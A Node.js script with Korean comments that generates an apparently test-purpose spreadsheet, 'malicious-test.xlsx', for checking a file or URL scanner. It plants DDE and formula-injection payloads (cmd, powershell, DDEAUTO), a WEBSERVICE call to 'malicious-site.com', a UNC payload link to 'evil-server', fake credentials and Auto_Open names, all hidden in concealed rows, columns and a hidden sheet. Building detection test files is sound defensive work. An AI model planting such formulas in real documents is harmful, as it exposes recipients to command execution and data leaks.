const XLSX = require('xlsx');
const fs = require('fs');

// 새 워크북 생성
const workbook = XLSX.utils.book_new();

// 메인 시트 데이터 (정상적으로 보이는 데이터)
const mainData = [
  ['회사명', '분기', '매출', '이익'],
  ['ABC Corp', '2024 Q1', 1000000, 250000],
  ['ABC Corp', '2024 Q2', 1200000, 300000],
  ['ABC Corp', '2024 Q3', 1100000, 280000],
  ['', '', '', ''],
  ['총계', '', '=SUM(C2:C4)', '=SUM(D2:D4)']
];

// 메인 시트 생성
const mainSheet = XLSX.utils.aoa_to_sheet(mainData);

// DDE 공격 패턴 수식 추가 (숨겨진 셀에)
mainSheet['Z100'] = { 
  f: '=cmd|"/c calc.exe"!A1',
  v: 0,
  t: 'n'
};

// 위험한 HYPERLINK 함수 추가
mainSheet['A10'] = {
  f: '=HYPERLINK("file:///c:/windows/system32/cmd.exe", "중요 문서 다운로드")',
  v: '중요 문서 다운로드',
  t: 's'
};

// 외부 파일 참조 추가
mainSheet['B10'] = {
  f: '=[외부파일.xlsx]Sheet1!A1',
  v: '#REF!',
  t: 'e'
};

// WEBSERVICE 함수 (외부 데이터 연결)
mainSheet['C10'] = {
  f: '=WEBSERVICE("http://malicious-site.com/data")',
  v: '#VALUE!',
  t: 'e'
};

// 메인 시트를 워크북에 추가
XLSX.utils.book_append_sheet(workbook, mainSheet, '매출보고서');

// 숨겨진 시트 생성 (악성 데이터 포함)
const hiddenData = [
  ['숨겨진 데이터'],
  ['=DDE("cmd","/c powershell.exe","")'],
  ['=msexcel|\'\\\\evil-server\\payload.xls\'!\'Click Here\''],
  ['=cmd|" /C calc"!A0'],
  ['@SUM(cmd|" /c notepad"!A1)'],
  ['사용자 비밀번호:', 'password123'],
  ['신용카드:', '1234-5678-9012-3456']
];

const hiddenSheet = XLSX.utils.aoa_to_sheet(hiddenData);

// 더 많은 DDE 패턴 추가
hiddenSheet['E1'] = {
  f: '=DDEAUTO("c:\\windows\\system32\\cmd.exe", "/c calc.exe")',
  v: 0,
  t: 'n'
};

// 워크북에 숨겨진 시트 추가
XLSX.utils.book_append_sheet(workbook, hiddenSheet, 'Hidden_Data');

// 또 다른 시트 (매크로 버튼처럼 보이게)
const macroData = [
  ['매크로 실행 시트'],
  [''],
  ['아래 버튼을 클릭하여 보고서를 생성하세요:'],
  ['[보고서 생성]'],
  [''],
  ['Auto_Open 매크로가 포함되어 있습니다']
];

const macroSheet = XLSX.utils.aoa_to_sheet(macroData);
XLSX.utils.book_append_sheet(workbook, macroSheet, 'Macros');

// 워크북 속성 설정 (숨겨진 시트 표시)
if (!workbook.Workbook) workbook.Workbook = {};
if (!workbook.Workbook.Sheets) workbook.Workbook.Sheets = [];

// Hidden_Data 시트를 숨김 처리
workbook.Workbook.Sheets[1] = { Hidden: 1 };

// 정의된 이름 추가 (자동 실행 매크로처럼 보이게)
if (!workbook.Workbook.Names) workbook.Workbook.Names = [];
workbook.Workbook.Names.push({
  Name: 'Auto_Open',
  Ref: 'Macros!$A$1'
});
workbook.Workbook.Names.push({
  Name: 'AutoExec',
  Ref: 'Hidden_Data!$A$1'
});

// 행/열 숨기기 설정
mainSheet['!rows'] = [
  null, null, null, null, null, null, null, null, null,
  { hidden: true }, // 10번째 행 숨기기 (위험한 함수들이 있는 행)
];

mainSheet['!cols'] = [
  null, null, null, null, null, null, null, null, null, null,
  null, null, null, null, null, null, null, null, null, null,
  null, null, null, null, null,
  { hidden: true } // Z열 숨기기 (DDE 공격 패턴이 있는 열)
];

// 파일 저장
const outputPath = '/Users/hongbook/Desktop/DEV/testurlnet/public/malicious-test.xlsx';
XLSX.writeFile(workbook, outputPath);

console.log('악성코드 의심 테스트 파일 생성 완료!');
console.log('파일 위치:', outputPath);
console.log('\n포함된 위험 요소:');
console.log('- DDE 공격 패턴 (=cmd|, =DDE, DDEAUTO 등)');
console.log('- 위험한 함수 (HYPERLINK, WEBSERVICE)');
console.log('- 외부 파일/링크 참조');
console.log('- 숨겨진 시트 (Hidden_Data)');
console.log('- 숨겨진 행/열');
console.log('- Auto_Open, AutoExec 이름 정의');
console.log('\n주의: 이 파일은 테스트 목적으로만 사용하세요!');
